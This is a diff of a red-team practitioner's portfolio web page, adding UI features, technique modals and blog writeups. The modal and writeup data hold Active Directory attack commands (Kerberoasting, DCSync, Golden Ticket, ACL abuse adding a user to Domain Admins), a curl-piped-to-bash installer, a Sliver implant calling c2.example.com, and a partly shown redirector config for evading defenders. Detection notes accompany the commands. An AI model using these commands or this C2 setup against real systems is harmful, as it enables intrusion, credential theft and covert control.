-        <span class="tool-tag primary" style="background:rgba(0,204,255,0.08);border-color:rgba(0,204,255,0.25);color:var(--accent2)">Python</span>
-        <span class="tool-tag">PowerShell</span>
-        <span class="tool-tag">Bash</span>
-        <span class="tool-tag">Go</span>
-        <span class="tool-tag">C#</span>
+        <span class="tool-tag primary" style="background:rgba(0,204,255,0.08);border-color:rgba(0,204,255,0.25);color:var(--accent2)" data-tip="Primary scripting language">Python</span>
+        <span class="tool-tag" data-tip="Windows automation">PowerShell</span>
+        <span class="tool-tag" data-tip="Shell scripting">Bash</span>
+        <span class="tool-tag" data-tip="Compiled tooling">Go</span>
+        <span class="tool-tag" data-tip=".NET offensive tools">C#</span>
       </div>
     </div>
-    <div class="arsenal-card red reveal">
-      <div class="arsenal-icon" style="color:var(--accent3);">// Platform</div>
+    <div class="arsenal-card red reveal" data-category="platform">
+      <div class="arsenal-icon">// Platform</div>
       <div class="arsenal-title">OS &amp; Environment</div>
       <div class="tool-list">
-        <span class="tool-tag primary" style="background:rgba(255,68,102,0.08);border-color:rgba(255,68,102,0.25);color:var(--accent3)">Kali Linux</span>
-        <span class="tool-tag">Parrot OS</span>
-        <span class="tool-tag">Windows</span>
-        <span class="tool-tag">VMware</span>
-        <span class="tool-tag">Docker</span>
+        <span class="tool-tag primary" style="background:rgba(255,68,102,0.08);border-color:rgba(255,68,102,0.25);color:var(--accent3)" data-tip="Primary attack OS">Kali Linux</span>
+        <span class="tool-tag" data-tip="Security-focused OS">Parrot OS</span>
+        <span class="tool-tag" data-tip="Target environment">Windows</span>
+        <span class="tool-tag" data-tip="Virtualization">VMware</span>
+        <span class="tool-tag" data-tip="Containerization">Docker</span>
       </div>
     </div>
   </div>
@@ -898,7 +1424,15 @@
     <h2 class="section-title">TTPs</h2>
     <div class="section-line"></div>
   </div>
-  <div class="reveal">
+  <div class="ttp-filters reveal">
+    <button class="filter-btn active" data-ttp-filter="all">All</button>
+    <button class="filter-btn" data-ttp-filter="credential">Credential Access</button>
+    <button class="filter-btn" data-ttp-filter="lateral">Lateral Movement</button>
+    <button class="filter-btn" data-ttp-filter="privesc">Privilege Escalation</button>
+    <button class="filter-btn" data-ttp-filter="persistence">Persistence</button>
+    <button class="filter-btn" data-ttp-filter="c2">Command &amp; Control</button>
+  </div>
+  <div class="reveal ttp-table-wrap">
     <table class="ttp-table">
       <thead>
         <tr>
@@ -906,62 +1440,72 @@
           <th>MITRE ATT&amp;CK</th>
           <th>Category</th>
           <th>Primary Tools</th>
+          <th></th>
         </tr>
       </thead>
-      <tbody>
-        <tr>
+      <tbody id="ttpBody">
+        <tr data-ttp-cat="credential" data-ttp-id="0">
           <td>Kerberoasting</td>
           <td>T1558.003</td>
           <td><span class="badge badge-red">Credential Access</span></td>
           <td>Rubeus, Impacket</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(0)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="credential" data-ttp-id="1">
           <td>AS-REP Roasting</td>
           <td>T1558.004</td>
           <td><span class="badge badge-red">Credential Access</span></td>
           <td>Rubeus, GetNPUsers</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(1)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="lateral" data-ttp-id="2">
           <td>Pass-the-Hash</td>
           <td>T1550.002</td>
           <td><span class="badge badge-blue">Lateral Movement</span></td>
           <td>CrackMapExec, Impacket</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(2)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="lateral" data-ttp-id="3">
           <td>Pass-the-Ticket</td>
           <td>T1550.003</td>
           <td><span class="badge badge-blue">Lateral Movement</span></td>
           <td>Mimikatz, Rubeus</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(3)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="credential" data-ttp-id="4">
           <td>DCSync</td>
           <td>T1003.006</td>
           <td><span class="badge badge-red">Credential Access</span></td>
           <td>Mimikatz, Impacket</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(4)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="credential" data-ttp-id="5">
           <td>LLMNR/NBT-NS Poisoning</td>
           <td>T1557.001</td>
           <td><span class="badge badge-red">Credential Access</span></td>
           <td>Responder</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(5)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="privesc" data-ttp-id="6">
           <td>ACL Abuse</td>
           <td>T1222</td>
           <td><span class="badge badge-green">Privilege Escalation</span></td>
           <td>PowerView, BloodHound</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(6)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="persistence" data-ttp-id="7">
           <td>Golden Ticket</td>
           <td>T1558.001</td>
           <td><span class="badge badge-green">Persistence</span></td>
           <td>Mimikatz</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(7)">Details</button></td>
         </tr>
-        <tr>
+        <tr data-ttp-cat="c2" data-ttp-id="8">
           <td>C2 via Sliver</td>
           <td>T1071</td>
           <td><span class="badge badge-blue">Command &amp; Control</span></td>
           <td>Sliver Framework</td>
+          <td><button class="ttp-detail-btn" onclick="openTTPModal(8)">Details</button></td>
         </tr>
       </tbody>
     </table>
@@ -976,7 +1520,6 @@
     <div class="section-line"></div>
   </div>
   <div class="certs-grid">
-
     <div class="cert-card reveal">
       <div class="cert-status">
         <div class="dot"></div>
@@ -1024,6 +1567,7 @@
       </div>
       <div class="cert-name">CRTO</div>
       <div class="cert-full">Certified Red Team Operator</div>
+      <div class="cert-progress"><div class="cert-progress-bar" data-width="65"></div></div>
       <div class="cert-issuer">Zero-Point Security <span>ZPS</span></div>
     </div>
 
@@ -1034,9 +1578,9 @@
       </div>
       <div class="cert-name">CRTL</div>
       <div class="cert-full">Certified Red Team Lead</div>
+      <div class="cert-progress"><div class="cert-progress-bar" data-width="30"></div></div>
       <div class="cert-issuer">Zero-Point Security <span>ZPS</span></div>
     </div>
-
   </div>
 </section>
 
@@ -1048,46 +1592,46 @@
     <div class="section-line"></div>
   </div>
   <div class="blog-grid">
-    
-    <a href="#" class="blog-card reveal">
+
+    <div class="blog-card reveal" onclick="openBlogModal(0)">
       <div class="blog-meta">
         <span class="date">// 2026.06.12</span>
         <span class="tag">Active Directory</span>
       </div>
       <div class="blog-title">Abusing ACLs for Privilege Escalation in AD</div>
       <div class="blog-excerpt">A deep dive into misconfigured Access Control Lists in Active Directory and how attackers can leverage them to escalate privileges from a standard domain user to Domain Admin.</div>
-      <div class="blog-read-more">Read Writeup →</div>
-    </a>
+      <div class="blog-read-more">Read Writeup &rarr;</div>
+    </div>
 
-    <a href="#" class="blog-card blue reveal">
+    <div class="blog-card blue reveal" onclick="openBlogModal(1)">
       <div class="blog-meta">
         <span class="date">// 2026.05.28</span>
         <span class="tag">C2 Infrastructure</span>
       </div>
       <div class="blog-title">Deploying Sliver C2 with HTTPS Redirectors</div>
       <div class="blog-excerpt">Setting up a resilient Command &amp; Control infrastructure using Sliver framework, complete with domain fronting and HTTPS redirectors to evade network defenses.</div>
-      <div class="blog-read-more">Read Writeup →</div>
-    </a>
+      <div class="blog-read-more">Read Writeup &rarr;</div>
+    </div>
 
-    <a href="#" class="blog-card red reveal">
+    <div class="blog-card red reveal" onclick="openBlogModal(2)">
       <div class="blog-meta">
         <span class="date">// 2026.04.15</span>
         <span class="tag">Web Pentesting</span>
       </div>
       <div class="blog-title">Chaining SSRF to Internal Service Compromise</div>
       <div class="blog-excerpt">Walkthrough of a recent web application assessment where an initial Server-Side Request Forgery vulnerability was chained to access internal metadata services and pivot into the cloud environment.</div>
-      <div class="blog-read-more">Read Writeup →</div>
-    </a>
+      <div class="blog-read-more">Read Writeup &rarr;</div>
+    </div>
 
-    <a href="#" class="blog-card reveal">
+    <div class="blog-card reveal" onclick="openBlogModal(3)">
       <div class="blog-meta">
         <span class="date">// 2026.03.02</span>
         <span class="tag">Kerberos</span>
       </div>
       <div class="blog-title">Kerberoasting vs. AS-REP Roasting: When to Use Which</div>
       <div class="blog-excerpt">Comparing two of the most common Active Directory credential access techniques, analyzing their detection vectors, and discussing operational security considerations for red teamers.</div>
-      <div class="blog-read-more">Read Writeup →</div>
-    </a>
+      <div class="blog-read-more">Read Writeup &rarr;</div>
+    </div>
 
   </div>
 </section>
@@ -1100,23 +1644,49 @@
     <div class="section-line"></div>
   </div>
   <div class="contact-inner">
-    <div class="contact-text reveal">
-      <h3>Let's talk<br><span>red team.</span></h3>
-      <p>Available for red team engagements, AD security assessments, and collaborative research. Reach out through any of the channels listed.</p>
+    <div class="reveal">
+      <div class="contact-text">
+        <h3>Let's talk<br><span>red team.</span></h3>
+        <p>Available for red team engagements, AD security assessments, and collaborative research. Reach out through any of the channels below or use the contact form.</p>
+      </div>
+      <div class="contact-links">
+        <a href="https://github.com/HeavyGhost-le" class="contact-link" target="_blank">
+          <div class="contact-link-icon">GH</div>
+          github.com/HeavyGhost-le
+        </a>
+        <a href="https://www.linkedin.com/in/neku-e-30a16220a/" class="contact-link" target="_blank">
+          <div class="contact-link-icon">LI</div>
+          linkedin.com/in/neku-e-30a16220a
+        </a>
+        <a href="https://app.hackthebox.com/users/2106711" class="contact-link" target="_blank">
+          <div class="contact-link-icon">HB</div>
+          HackTheBox &mdash; HeavyGhost0x00
+        </a>
+      </div>
     </div>
-    <div class="contact-links reveal">
-      <a href="https://github.com/HeavyGhost-le" class="contact-link" target="_blank">
-        <div class="contact-link-icon">GH</div>
-        github.com/HeavyGhost-le
-      </a>
-      <a href="https://www.linkedin.com/in/neku-e-30a16220a/" class="contact-link" target="_blank">
-        <div class="contact-link-icon">LI</div>
-        linkedin.com/in/neku-e-30a16220a
-      </a>
-      <a href="https://app.hackthebox.com/users/2106711" class="contact-link">
-        <div class="contact-link-icon">HB</div>
-        HackTheBox — HeavyGhost0x00
-      </a>
+    <div class="reveal">
+      <form class="contact-form" id="contactForm">
+        <div class="form-row">
+          <div class="form-group">
+            <label for="contactName">Name</label>
+            <input type="text" id="contactName" name="name" placeholder="Your name" required>
+          </div>
+          <div class="form-group">
+            <label for="contactEmail">Email</label>
+            <input type="email" id="contactEmail" name="email" placeholder="your@email.com" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="contactSubject">Subject</label>
+          <input type="text" id="contactSubject" name="subject" placeholder="Engagement / Research / Collaboration">
+        </div>
+        <div class="form-group">
+          <label for="contactMessage">Message</label>
+          <textarea id="contactMessage" name="message" placeholder="Tell me about your project or inquiry..." required></textarea>
+        </div>
+        <button type="submit" class="form-submit">Send Message</button>
+        <div class="form-status" id="formStatus"></div>
+      </form>
     </div>
   </div>
 </section>
@@ -1127,17 +1697,57 @@
   <p>Built with intent &amp; <span class="accent">0x</span>curiosity</p>
 </footer>
 
+<!-- BACK TO TOP -->
+<a href="#hero" class="back-to-top" id="backToTop" title="Back to top">&uarr;</a>
+
+<!-- BLOG MODAL -->
+<div class="modal-overlay" id="blogModal">
+  <div class="modal-content">
+    <button class="modal-close" onclick="closeBlogModal()">&times;</button>
+    <div class="modal-tag" id="modalTag"></div>
+    <div class="modal-date" id="modalDate"></div>
+    <h2 class="modal-title" id="modalTitle"></h2>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<!-- TTP DETAIL MODAL -->
+<div class="ttp-modal-overlay" id="ttpModal">
+  <div class="ttp-modal-content">
+    <button class="modal-close" onclick="closeTTPModal()">&times;</button>
+    <h2 id="ttpModalTitle"></h2>
+    <div class="ttp-mitre" id="ttpModalMitre"></div>
+    <div class="ttp-desc" id="ttpModalDesc"></div>
+    <div class="ttp-info-grid" id="ttpModalInfo"></div>
+    <pre id="ttpModalCmd"></pre>
+  </div>
+</div>
+
 <script>
-  // Custom cursor
+  // ============ CUSTOM CURSOR ============
   const cursor = document.getElementById('cursor');
   const ring = document.getElementById('cursor-ring');
+  let cursorVisible = true;
+
   document.addEventListener('mousemove', e => {
     cursor.style.left = e.clientX + 'px';
     cursor.style.top = e.clientY + 'px';
     ring.style.left = e.clientX + 'px';
     ring.style.top = e.clientY + 'px';
+    if (!cursorVisible) {
+      cursor.style.opacity = '1';
+      ring.style.opacity = '1';
+      cursorVisible = true;
+    }
   });
-  document.querySelectorAll('a, button').forEach(el => {
+
+  document.addEventListener('mouseleave', () => {
+    cursor.style.opacity = '0';
+    ring.style.opacity = '0';
+    cursorVisible = false;
+  });
+
+  document.querySelectorAll('a, button, input, textarea, .blog-card, .filter-btn').forEach(el => {
     el.addEventListener('mouseenter', () => {
       ring.style.transform = 'translate(-50%, -50%) scale(1.6)';
       ring.style.borderColor = 'rgba(0,255,136,0.6)';
@@ -1148,7 +1758,38 @@
     });
   });
 
-  // Hex grid generator
+  // ============ MATRIX RAIN ============
+  const canvas = document.getElementById('matrixCanvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const chars = '0123456789ABCDEFabcdef@#$%^&*';
+  const fontSize = 14;
+  const columns = Math.floor(canvas.width / fontSize);
+  const drops = Array(columns).fill(1);
+
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(5,5,8,0.08)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff88';
+    ctx.font = fontSize + 'px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+
+  // ============ HEX GRID ============
   const hexCodes = ['A1','3F','FF','00','C2','7E','B4','19','D0','8A','4C','F1','6B','2D','93','E5','0F','77','AA','CB','11','5C','88','31','DE'];
   const grid = document.getElementById('hexGrid');
   if (grid) {
@@ -1165,17 +1806,549 @@
     });
   }
 
-  // Scroll reveal
+  // ============ TYPING ANIMATION ============
+  const typedPhrases = [
+    'ghost@redteam:~$ nmap -sV -p- target.corp',
+    'ghost@redteam:~$ bloodhound-python -d corp.local',
+    'ghost@redteam:~$ impacket-secretsdump admin@DC01',
+    'ghost@redteam:~$ sliver > generate --http target.com',
+    'ghost@redteam:~$ crackmapexec smb 10.0.0.0/24',
+    'ghost@redteam:~$ rubeus kerberoast /outfile:hashes.txt',
+    'ghost@redteam:~$ ffuf -w wordlist.txt -u https://target/FUZZ',
+  ];
+  const typedEl = document.getElementById('typedText');
+  let phraseIdx = 0, charIdx = 0, isDeleting = false;
+
+  function typeLoop() {
+    const current = typedPhrases[phraseIdx];
+    if (!isDeleting) {
+      typedEl.textContent = current.substring(0, charIdx + 1);
+      charIdx++;
+      if (charIdx === current.length) {
+        isDeleting = true;
+        setTimeout(typeLoop, 2000);
+        return;
+      }
+      setTimeout(typeLoop, 40 + Math.random() * 30);
+    } else {
+      typedEl.textContent = current.substring(0, charIdx - 1);
+      charIdx--;
+      if (charIdx === 0) {
+        isDeleting = false;
+        phraseIdx = (phraseIdx + 1) % typedPhrases.length;
+        setTimeout(typeLoop, 400);
+        return;
+      }
+      setTimeout(typeLoop, 20);
+    }
+  }
+  setTimeout(typeLoop, 1500);
+
+  // ============ HAMBURGER MENU ============
+  const hamburger = document.getElementById('hamburger');
+  const navLinks = document.getElementById('navLinks');
+  const overlay = document.getElementById('mobileOverlay');
+
+  hamburger.addEventListener('click', () => {
+    hamburger.classList.toggle('open');
+    navLinks.classList.toggle('open');
+    overlay.classList.toggle('open');
+  });
+  overlay.addEventListener('click', () => {
+    hamburger.classList.remove('open');
+    navLinks.classList.remove('open');
+    overlay.classList.remove('open');
+  });
+  navLinks.querySelectorAll('a').forEach(a => {
+    a.addEventListener('click', () => {
+      hamburger.classList.remove('open');
+      navLinks.classList.remove('open');
+      overlay.classList.remove('open');
+    });
+  });
+
+  // ============ NAV SCROLL EFFECTS ============
+  const mainNav = document.getElementById('mainNav');
+  const sections = document.querySelectorAll('section[id]');
+  const navItems = document.querySelectorAll('.nav-link');
+  const backToTop = document.getElementById('backToTop');
+
+  function onScroll() {
+    const scrollY = window.scrollY;
+
+    // Shrink nav on scroll
+    mainNav.classList.toggle('scrolled', scrollY > 50);
+
+    // Back to top visibility
+    backToTop.classList.toggle('visible', scrollY > 500);
+
+    // Active nav link
+    let current = '';
+    sections.forEach(section => {
+      const top = section.offsetTop - 120;
+      if (scrollY >= top) current = section.id;
+    });
+    navItems.forEach(item => {
+      item.classList.toggle('active', item.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+
+  // ============ SCROLL REVEAL ============
   const reveals = document.querySelectorAll('.reveal');
-  const observer = new IntersectionObserver(entries => {
-    entries.forEach((e, i) => {
-      if (e.isIntersecting) {
-        setTimeout(() => e.target.classList.add('visible'), 80 * [...reveals].indexOf(e.target) % 4);
-        observer.unobserve(e.target);
+  const revealObserver = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.classList.add('visible');
+        revealObserver.unobserve(entry.target);
       }
     });
   }, { threshold: 0.1 });
-  reveals.forEach(r => observer.observe(r));
+  reveals.forEach(r => revealObserver.observe(r));
+
+  // ============ CERT PROGRESS BARS ============
+  const progressBars = document.querySelectorAll('.cert-progress-bar');
+  const progressObserver = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const bar = entry.target;
+        bar.style.width = bar.dataset.width + '%';
+        progressObserver.unobserve(bar);
+      }
+    });
+  }, { threshold: 0.5 });
+  progressBars.forEach(b => progressObserver.observe(b));
+
+  // ============ ARSENAL FILTERS ============
+  const filterBtns = document.querySelectorAll('.arsenal-filters .filter-btn');
+  const arsenalCards = document.querySelectorAll('.arsenal-card');
+
+  filterBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      filterBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const filter = btn.dataset.filter;
+      arsenalCards.forEach(card => {
+        card.classList.toggle('hidden', filter !== 'all' && card.dataset.category !== filter);
+      });
+    });
+  });
+
+  // ============ ARSENAL SEARCH ============
+  const arsenalSearch = document.getElementById('arsenalSearch');
+  arsenalSearch.addEventListener('input', () => {
+    const query = arsenalSearch.value.toLowerCase().trim();
+    arsenalCards.forEach(card => {
+      const tools = card.querySelectorAll('.tool-tag');
+      let match = false;
+      tools.forEach(tag => {
+        const text = tag.textContent.toLowerCase();
+        if (text.includes(query) || query === '') {
+          match = true;
+          tag.classList.toggle('highlight', query !== '' && text.includes(query));
+        } else {
+          tag.classList.remove('highlight');
+        }
+      });
+      if (query === '') {
+        card.classList.remove('hidden');
+        tools.forEach(t => t.classList.remove('highlight'));
+      } else {
+        card.classList.toggle('hidden', !match);
+      }
+    });
+    // Reset filter buttons
+    if (query !== '') {
+      filterBtns.forEach(b => b.classList.remove('active'));
+    } else {
+      filterBtns[0].classList.add('active');
+    }
+  });
+
+  // ============ TTP FILTERS ============
+  const ttpFilterBtns = document.querySelectorAll('[data-ttp-filter]');
+  const ttpRows = document.querySelectorAll('#ttpBody tr');
+
+  ttpFilterBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      ttpFilterBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const filter = btn.dataset.ttpFilter;
+      ttpRows.forEach(row => {
+        row.classList.toggle('ttp-hidden', filter !== 'all' && row.dataset.ttpCat !== filter);
+      });
+    });
+  });
+
+  // ============ TTP DETAIL MODAL ============
+  const ttpData = [
+    {
+      title: 'Kerberoasting',
+      mitre: 'T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting',
+      desc: 'Kerberoasting targets service accounts by requesting TGS tickets for SPNs, then cracking the ticket offline to recover the service account password. Effective against accounts with weak passwords and SPNs registered in AD.',
+      tools: 'Rubeus, Impacket (GetUserSPNs)',
+      detection: 'Event ID 4769 with encryption type 0x17 (RC4)',
+      cmd: '# Using Rubeus\nRubeus.exe kerberoast /outfile:hashes.kerberoast\n\n# Using Impacket\nimpacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.local/user:pass'
+    },
+    {
+      title: 'AS-REP Roasting',
+      mitre: 'T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting',
+      desc: 'Targets accounts that do not require Kerberos pre-authentication. The AS-REP response contains encrypted data that can be cracked offline to recover the account password.',
+      tools: 'Rubeus, Impacket (GetNPUsers)',
+      detection: 'Event ID 4768 without pre-authentication',
+      cmd: '# Using Rubeus\nRubeus.exe asreproast /outfile:asrep.txt\n\n# Using Impacket\nimpacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.1'
+    },
+    {
+      title: 'Pass-the-Hash',
+      mitre: 'T1550.002 — Use Alternate Authentication Material: Pass the Hash',
+      desc: 'Allows authentication using NTLM hash without knowing the plaintext password. Enables lateral movement across systems where the same credentials are reused.',
+      tools: 'CrackMapExec, Impacket (psexec/wmiexec)',
+      detection: 'Event ID 4624 Type 3 with NTLM authentication',
+      cmd: '# Using CrackMapExec\ncrackmapexec smb 10.10.10.0/24 -u admin -H aad3b435...:hash123\n\n# Using Impacket\nimpacket-psexec -hashes :hash123 admin@10.10.10.5'
+    },
+    {
+      title: 'Pass-the-Ticket',
+      mitre: 'T1550.003 — Use Alternate Authentication Material: Pass the Ticket',
+      desc: 'Injects stolen Kerberos tickets into a session to authenticate as another user without their password. Works with both TGTs and TGS tickets.',
+      tools: 'Mimikatz, Rubeus',
+      detection: 'Event ID 4768/4769 anomalies, impossible logon patterns',
+      cmd: '# Export tickets with Mimikatz\nmimikatz # sekurlsa::tickets /export\n\n# Import ticket with Rubeus\nRubeus.exe ptt /ticket:ticket.kirbi'
+    },
+    {
+      title: 'DCSync',
+      mitre: 'T1003.006 — OS Credential Dumping: DCSync',
+      desc: 'Simulates domain controller replication to extract password hashes from AD. Requires Replicating Directory Changes permissions. One of the most powerful credential access techniques in AD.',
+      tools: 'Mimikatz, Impacket (secretsdump)',
+      detection: 'Event ID 4662 with replication GUIDs, DRS traffic from non-DC',
+      cmd: '# Using Mimikatz\nmimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt\n\n# Using Impacket\nimpacket-secretsdump corp.local/admin:pass@DC01.corp.local'
+    },
+    {
+      title: 'LLMNR/NBT-NS Poisoning',
+      mitre: 'T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning',
+      desc: 'Responds to broadcast name resolution requests on the local network to capture NTLMv2 hashes. Effective in networks where LLMNR and NBT-NS are not disabled.',
+      tools: 'Responder',
+      detection: 'Network monitoring for LLMNR/NBT-NS responses from unauthorized hosts',
+      cmd: '# Start Responder\nsudo responder -I eth0 -dwPv\n\n# Crack captured hashes\nhashcat -m 5600 hashes.txt wordlist.txt'
+    },
+    {
+      title: 'ACL Abuse',
+      mitre: 'T1222 — File and Directory Permissions Modification',
+      desc: 'Exploits misconfigured Access Control Lists in Active Directory to escalate privileges. Common abusable permissions include GenericAll, GenericWrite, WriteDACL, and ForceChangePassword.',
+      tools: 'PowerView, BloodHound',
+      detection: 'Event ID 5136 (Directory Service Changes), ACL auditing',
+      cmd: '# Enumerate ACLs with PowerView\nFind-InterestingDomainAcl -ResolveGUIDs\n\n# Abuse GenericAll on user\nSet-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "newpass" -AsPlainText -Force)'
+    },
+    {
+      title: 'Golden Ticket',
+      mitre: 'T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket',
+      desc: 'Forges a TGT using the KRBTGT account hash, granting unrestricted access to the entire domain. Provides long-term persistence as the ticket remains valid until the KRBTGT password is changed twice.',
+      tools: 'Mimikatz',
+      detection: 'TGT with abnormal lifetime, Event ID 4769 anomalies',
+      cmd: '# Create Golden Ticket\nmimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /user:fakeadmin /ptt\n\n# Verify access\ndir \\\\DC01\\C$'
+    },
+    {
+      title: 'C2 via Sliver',
+      mitre: 'T1071 — Application Layer Protocol',
+      desc: 'Sliver is an open-source C2 framework supporting multiple protocols (HTTPS, mTLS, WireGuard, DNS). Used for implant generation, post-exploitation, and maintaining persistent access during red team operations.',
+      tools: 'Sliver Framework',
+      detection: 'Network signatures, JA3/JA3S fingerprinting, behavioral analysis',
+      cmd: '# Generate HTTPS implant\nsliver > generate --http https://c2.example.com --os windows\n\n# Start HTTPS listener\nsliver > https --domain c2.example.com --lport 443'
+    }
+  ];
+
+  function openTTPModal(id) {
+    const d = ttpData[id];
+    document.getElementById('ttpModalTitle').textContent = d.title;
+    document.getElementById('ttpModalMitre').textContent = d.mitre;
+    document.getElementById('ttpModalDesc').textContent = d.desc;
+    document.getElementById('ttpModalInfo').innerHTML = `
+      <div class="ttp-info-box"><div class="label">Tools</div><div class="value">${d.tools}</div></div>
+      <div class="ttp-info-box"><div class="label">Detection</div><div class="value">${d.detection}</div></div>
+    `;
+    document.getElementById('ttpModalCmd').textContent = d.cmd;
+    document.getElementById('ttpModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeTTPModal() {
+    document.getElementById('ttpModal').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  document.getElementById('ttpModal').addEventListener('click', e => {
+    if (e.target === document.getElementById('ttpModal')) closeTTPModal();
+  });
+
+  // ============ BLOG MODAL ============
+  const blogPosts = [
+    {
+      tag: 'Active Directory',
+      date: '// 2026.06.12',
+      title: 'Abusing ACLs for Privilege Escalation in AD',
+      body: `
+        <h3>// Overview</h3>
+        <p>Access Control Lists (ACLs) in Active Directory define permissions for objects like users, groups, and OUs. When misconfigured, they create invisible privilege escalation paths that are often overlooked by defenders but trivially exploited by attackers.</p>
+
+        <h3>// Common Abusable Permissions</h3>
+        <ul>
+          <li><strong>GenericAll</strong> — Full control over the target object. Allows password resets, group membership changes, and more.</li>
+          <li><strong>GenericWrite</strong> — Modify attributes of the target object. Can be used to set SPNs for Kerberoasting.</li>
+          <li><strong>WriteDACL</strong> — Modify the ACL itself. The attacker can grant themselves any permission.</li>
+          <li><strong>ForceChangePassword</strong> — Reset a user's password without knowing the current one.</li>
+          <li><strong>WriteOwner</strong> — Take ownership of an object, then modify its DACL.</li>
+        </ul>
+
+        <h3>// Enumeration with BloodHound</h3>
+        <p>BloodHound excels at visualizing these attack paths. After collecting data with SharpHound, query for shortest paths to Domain Admin that leverage ACL abuse:</p>
+        <pre>SharpHound.exe --CollectionMethods All --Domain corp.local
+
+# In BloodHound UI:
+# Query: "Shortest Paths to Domain Admins from Owned Principals"
+# Look for edges: GenericAll, WriteDACL, GenericWrite, Owns</pre>
+
+        <h3>// Exploitation: GenericAll on User</h3>
+        <p>If your compromised user has GenericAll on a high-privilege account, you can simply reset their password:</p>
+        <pre># PowerView
+Set-DomainUserPassword -Identity targetadmin -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -Verbose
+
+# Or set an SPN and Kerberoast
+Set-DomainObject -Identity targetadmin -Set @{serviceprincipalname='http/fake'} -Verbose</pre>
+
+        <h3>// Exploitation: WriteDACL on Group</h3>
+        <p>WriteDACL on a group like Domain Admins allows you to grant yourself the ability to add members:</p>
+        <pre># Grant GenericAll to yourself
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity youruser -Rights All
+
+# Add yourself to Domain Admins
+Add-DomainGroupMember -Identity "Domain Admins" -Members youruser</pre>
+
+        <h3>// Defense Recommendations</h3>
+        <ul>
+          <li>Audit ACLs regularly with tools like <code>ADACLScanner</code></li>
+          <li>Enable SACL auditing (Event ID 5136) for sensitive objects</li>
+          <li>Follow the principle of least privilege for delegated permissions</li>
+          <li>Use AdminSDHolder to protect privileged accounts</li>
+          <li>Implement tiered administration to limit attack surface</li>
+        </ul>
+      `
+    },
+    {
+      tag: 'C2 Infrastructure',
+      date: '// 2026.05.28',
+      title: 'Deploying Sliver C2 with HTTPS Redirectors',
+      body: `
+        <h3>// Overview</h3>
+        <p>A resilient Command & Control infrastructure is critical for red team operations. This writeup covers setting up Sliver C2 with HTTPS redirectors to add a layer of obfuscation and protect your team server from direct exposure.</p>
+
+        <h3>// Architecture</h3>
+        <p>The setup uses a multi-tier architecture:</p>
+        <ul>
+          <li><strong>Team Server</strong> — Backend Sliver instance, not directly accessible from target network</li>
+          <li><strong>Redirector(s)</strong> — Lightweight VPS instances that proxy traffic to the team server</li>
+          <li><strong>Domain</strong> — Categorized domain with valid SSL certificate for HTTPS communications</li>
+        </ul>
+
+        <h3>// Setting Up the Team Server</h3>
+        <pre># Install Sliver
+curl https://sliver.sh/install | sudo bash
+
+# Start Sliver server
+sliver-server
+
+# Generate operator config for multiplayer
+sliver > new-operator --name operator1 --lhost teamserver.internal</pre>
+
+        <h3>// Configuring HTTPS Redirectors</h3>
+        <p>Using Apache mod_rewrite on the redirector to forward C2 traffic while serving a legitimate-looking site to scanners:</p>
+        <pre># /etc/apache2/sites-available/redirector.conf
+&lt;VirtualHost *:443&gt;
+    ServerName c2.example.com
+    SSLEngine on
+    SSLCertificateFile /etc/letsencrypt/live/c2.example.com/fullchain.pem
+    SSLCertificateKeyFile /etc/letsencrypt/live/c2.example.com/privkey.pem
+
+    RewriteEngine On
+    # Forward Sliver traffic to team server
+    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*" [NC]
